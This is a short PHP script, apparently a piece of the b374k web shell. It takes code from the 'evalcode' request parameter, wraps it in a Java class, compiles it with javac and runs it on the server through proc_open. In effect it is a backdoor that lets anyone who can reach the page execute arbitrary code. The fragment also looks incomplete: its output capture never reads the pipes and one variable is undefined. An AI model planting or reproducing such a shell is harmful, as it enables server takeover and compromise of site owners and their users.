<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w"));
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		@proc_close($s_proc);
	}
	return $s_out;
}

$_GP = array_merge($_POST, $_GET);
$s_code = $_GP['evalcode'];
$s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
$s_script = $s_rand;
$s_code = "class ".$s_rand." { ".$s_code . " } ";
if(file_put_contents($s_script.".java", $s_code)!==false){
	$s_res = exe("javac ".$s_script.".java");
	if(@is_file($s_script.".class")){
		$s_res .= exe("java ".$s_evaloption." ".$s_script);
		unlink($s_script.".class");
	}
	unlink($s_script.".java");
}
?>